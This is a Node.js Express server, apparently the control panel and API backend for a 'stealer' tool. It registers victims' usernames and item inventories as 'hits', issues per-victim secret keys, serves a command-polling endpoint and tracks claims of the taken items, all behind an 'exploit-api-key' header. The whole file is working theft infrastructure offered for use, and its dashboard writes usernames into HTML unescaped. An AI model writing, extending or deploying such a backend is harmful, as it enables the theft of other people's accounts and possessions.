const express = require('express');
const crypto = require('crypto');

const app = express();
app.use(express.text({ type: '*/*', limit: '10mb' }));
app.use(express.json({ limit: '10mb' }));

// ⚠️ غيّر المفتاح ده لأي حاجة سرية
const API_KEY = process.env.API_KEY || "CHANGE_ME_TO_SECRET_KEY";

// مخزن مؤقت (للإنتاج استخدم Database)
const hits = {};
const executions = {};
const connections = {};

// Middleware للتحقق
function auth(req, res, next) {
    const key = req.headers['exploit-api-key'];
    if (key !== API_KEY) {
        return res.status(401).json({ success: false, error: 'Unauthorized' });
    }
    next();
}

// ============================================
// 1) POST /hits/execution
// ============================================
app.post('/hits/execution', auth, (req, res) => {
    let body;
    try {
        body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
    } catch (e) {
        return res.status(400).json({ success: false, error: 'Bad JSON' });
    }
    
    const execId = crypto.randomUUID();
    executions[execId] = { ...body, time: Date.now() };
    
    console.log(`[EXECUTION] ${body.executor} - ${body.stealerId}`);
    
    res.json({
        success: true,
        data: { executionId: execId }
    });
});

// ============================================
// 2) POST /hits/register
// ============================================
app.post('/hits/register', auth, (req, res) => {
    let payload;
    try {
        payload = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
    } catch (e) {
        return res.status(400).json({ success: false, error: 'Bad payload' });
    }
    
    const hitId = crypto.randomUUID();
    const secretKey = crypto.randomBytes(16).toString('hex');
    
    const inventory = payload.inventory || {};
    const items = Object.values(inventory).map(item => ({
        id: crypto.randomUUID(),
        uniqueId: item.uniqueId,
        valuable: { name: item.valuable, price: 0 },
        count: item.count,
        claimedCount: 0,
        isWanted: true
    }));
    
    hits[hitId] = {
        id: hitId,
        secretKey,
        username: payload.username,
        items,
        usernames: [payload.username],
        time: Date.now()
    };
    
    connections[secretKey] = { hitId };
    
    console.log(`[HIT] ${payload.username} - ${items.length} items`);
    
    res.json({
        success: true,
        data: {
            hit: hits[hitId],
            secretKey: secretKey,
            usernames: [payload.username]
        }
    });
});

// ============================================
// 3) POST + GET /hits/connection
// ============================================
app.post('/hits/connection', auth, (req, res) => {
    const secretKey = req.query.secretKey;
    if (!connections[secretKey]) {
        return res.status(404).json({ success: false, error: 'Not found' });
    }
    console.log(`[CONNECT] ${secretKey}`);
    res.json({ success: true, data: { connected: true } });
});

app.get('/hits/connection', auth, (req, res) => {
    const secretKey = req.query.secretKey;
    if (!connections[secretKey]) {
        return res.status(404).json({ success: false, error: 'Not found' });
    }
    res.json({
        success: true,
        data: { commands: [], timestamp: Date.now() }
    });
});

// ============================================
// 4) POST /hits/claim
// ============================================
app.post('/hits/claim', auth, (req, res) => {
    let body;
    try {
        body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
    } catch (e) {
        return res.status(400).json({ success: false, error: 'Bad JSON' });
    }
    
    const { secretKey, uniqueId, count } = body;
    const conn = connections[secretKey];
    
    if (!conn) {
        return res.status(404).json({ success: false, error: 'Not found' });
    }
    
    const hit = hits[conn.hitId];
    const item = hit.items.find(i => i.uniqueId === uniqueId);
    
    if (item) {
        item.claimedCount += count;
        console.log(`[CLAIM] ${uniqueId} x${count}`);
    }
    
    res.json({ success: true, data: { claimed: true } });
});

// ============================================
// لوحة تحكم بسيطة
// ============================================
app.get('/', (req, res) => {
    let html = '<html><head><title>API</title></head><body>';
    html += '<h1>Syncrypt API</h1>';
    html += `<h2>Hits (${Object.keys(hits).length})</h2><ul>`;
    for (const id in hits) {
        const h = hits[id];
        html += `<li><b>${h.username}</b> - ${h.items.length} items - ${new Date(h.time).toLocaleString()}</li>`;
    }
    html += '</ul></body></html>';
    res.send(html);
});

// Health check
app.get('/health', (req, res) => res.json({ ok: true }));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server on port ${PORT}`));
